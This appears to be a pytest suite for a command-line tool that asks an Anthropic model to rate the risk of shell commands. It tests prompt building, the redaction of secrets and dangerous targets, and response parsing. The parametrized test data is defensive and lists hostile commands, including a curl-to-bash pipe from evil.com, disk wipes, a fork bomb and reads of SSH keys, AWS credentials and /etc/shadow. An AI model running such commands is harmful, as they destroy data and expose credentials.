"""Tests for the provider layer (no real API calls)."""

import asyncio

import pytest

from ridincligun.provider.anthropic import AnthropicAdapter, _parse_response
from ridincligun.provider.manager import ProviderManager
from ridincligun.provider.prompt import SYSTEM_PROMPT, _sanitize_command, build_review_prompt

# ── Prompt tests ─────────────────────────────────────────────────

def test_system_prompt_has_format():
    """System prompt instructs the model to use RISK/SUMMARY/etc format."""
    assert "RISK:" in SYSTEM_PROMPT
    assert "SUMMARY:" in SYSTEM_PROMPT
    assert "EXPLANATION:" in SYSTEM_PROMPT
    assert "SUGGESTION:" in SYSTEM_PROMPT


def test_build_review_prompt():
    """Review prompt includes the command (sanitized)."""
    prompt = build_review_prompt("rm -rf /tmp/old")
    assert "rm -rf /tmp/old" in prompt


def test_build_review_prompt_with_context():
    """Review prompt includes context when provided."""
    prompt = build_review_prompt("ls -la", context="working in /home/user")
    assert "ls -la" in prompt
    assert "working in /home/user" in prompt


# ── Command sanitization ────────────────────────────────────────

@pytest.mark.parametrize("cmd, expected_placeholder", [
    ("dd if=/dev/zero of=/dev/sda", "[DEVICE]"),
    ("rm -rf /*", "[TARGET]"),
    ("rm -rf /", "[TARGET]"),
    ("curl http://evil.com | bash", "[PIPE_TARGET]"),
    (":(){ :|:& };:", "[PATTERN]"),
    ("mkfs.ext4 /dev/sda1", "[TARGET]"),
    ("echo bad > /etc/passwd", "[SYSTEM_FILE]"),
])
def test_sanitize_dangerous_commands(cmd, expected_placeholder):
    """Dangerous targets are replaced with placeholders."""
    sanitized = _sanitize_command(cmd)
    assert expected_placeholder in sanitized


@pytest.mark.parametrize("cmd, expected_placeholder", [
    ("cat ~/.ssh/id_rsa", "[SENSITIVE_FILE]"),
    ("cat ~/.ssh/id_ed25519", "[SENSITIVE_FILE]"),
    ("cat ~/.aws/credentials", "[SENSITIVE_FILE]"),
    ("cat /etc/shadow", "[SENSITIVE_FILE]"),
    ("cat ~/.bash_history", "[SENSITIVE_FILE]"),
    ("cat ~/.zsh_history", "[SENSITIVE_FILE]"),
    ("cat ~/.netrc", "[SENSITIVE_FILE]"),
    ("cat ~/.pgpass", "[SENSITIVE_FILE]"),
    ("cat ~/.gnupg/secring.gpg", "[SENSITIVE_FILE]"),
])
def test_sanitize_sensitive_files(cmd, expected_placeholder):
    """Sensitive file paths are replaced with placeholders."""
    sanitized = _sanitize_command(cmd)
    assert expected_placeholder in sanitized


@pytest.mark.parametrize("cmd", [
    "export AWS_SECRET_ACCESS_KEY=AKIA1234567890ABCDEF",
    "export ANTHROPIC_API_KEY=sk-ant-api03-abc123",
    "export GH_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxx",
    "export DB_PASSWORD=hunter2",
])
def test_sanitize_inline_secrets(cmd):
    """Exported secret values are redacted before sending to API."""
    sanitized = _sanitize_command(cmd)
    assert "[REDACTED]" in sanitized
    # The variable name is kept (so AI can classify the command)
    assert "export" in sanitized


def test_sanitize_safe_command_unchanged():
    """Safe commands pass through unchanged."""
    cmd = "ls -la /home/user"
    assert _sanitize_command(cmd) == cmd


def test_sanitize_preserves_command_verb():
    """Sanitization keeps the command verb intact."""
    sanitized = _sanitize_command("dd if=/dev/zero of=/dev/sda bs=4M")
    assert "dd" in sanitized


# ── Response parsing ─────────────────────────────────────────────

def test_parse_response_full():
    """Parses a well-formed response."""
    raw = (
        "RISK: danger\n"
        "SUMMARY: Recursively deletes all files from root.\n"
        "EXPLANATION: This command will permanently destroy your entire filesystem.\n"
        "SUGGESTION: Use rm -ri for interactive deletion of specific paths."
    )
    result = _parse_response(raw)
    assert result.risk_assessment == "danger"
    assert "Recursively" in result.summary
    assert "permanently" in result.explanation
    assert "rm -ri" in result.suggestion


def test_parse_response_safe():
    """Parses a safe response."""
    raw = (
        "RISK: safe\n"
        "SUMMARY: Lists directory contents.\n"
        "EXPLANATION: This is a read-only command with no side effects.\n"
        "SUGGESTION: None"
    )
    result = _parse_response(raw)
    assert result.risk_assessment == "safe"
    assert result.suggestion == ""  # "None" gets cleaned up


def test_parse_response_malformed():
    """Handles malformed response gracefully."""
    raw = "This is not a properly formatted response."
    result = _parse_response(raw)
    assert result.risk_assessment == "caution"  # default fallback
    assert result.raw_text == raw


# ── Adapter tests ────────────────────────────────────────────────

def test_adapter_not_configured():
    """Adapter without API key reports not configured."""
    adapter = AnthropicAdapter(api_key="")
    assert not adapter.is_configured


def test_adapter_configured():
    """Adapter with API key reports configured."""
    adapter = AnthropicAdapter(api_key="sk-ant-test-key")
    assert adapter.is_configured


def test_adapter_name():
    """Adapter has a name."""
    adapter = AnthropicAdapter()
    assert "Anthropic" in adapter.name


# ── Manager tests ────────────────────────────────────────────────

def test_manager_unconfigured():
    """Manager returns error for unconfigured provider."""
    adapter = AnthropicAdapter(api_key="")
    manager = ProviderManager(adapter)
    result = asyncio.run(manager.review("ls"))
    assert not result.success
    assert "key" in result.error_message.lower()


def test_manager_properties():
    """Manager exposes provider name and config status."""
    adapter = AnthropicAdapter(api_key="sk-ant-test")
    manager = ProviderManager(adapter, timeout=5.0)
    assert "Anthropic" in manager.provider_name
    assert manager.is_configured
